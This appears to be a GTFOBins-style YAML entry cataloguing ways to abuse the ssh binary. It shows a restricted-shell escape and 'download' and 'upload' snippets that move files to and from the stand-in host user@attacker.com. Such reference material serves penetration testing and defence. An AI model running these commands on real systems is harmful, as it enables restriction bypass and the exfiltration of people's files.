---
functions:
  execute-interactive:
    - description: Reconnecting may help bypassing restricted shells.
      code: ssh localhost $SHELL --noprofile --norc
  download:
    - description: Fetch a remote file from a SSH server.
      code: |
        HOST=user@attacker.com
        RPATH=file_to_get
        LPATH=where_to_save
        ssh $HOST "cat $RPATH" > $LPATH
  upload:
    - description: Send local file to a SSH server.
      code: |
        HOST=user@attacker.com
        RPATH=where_to_save
        LPATH=file_to_send
        ssh $HOST "cat > $RPATH" < $LPATH
---
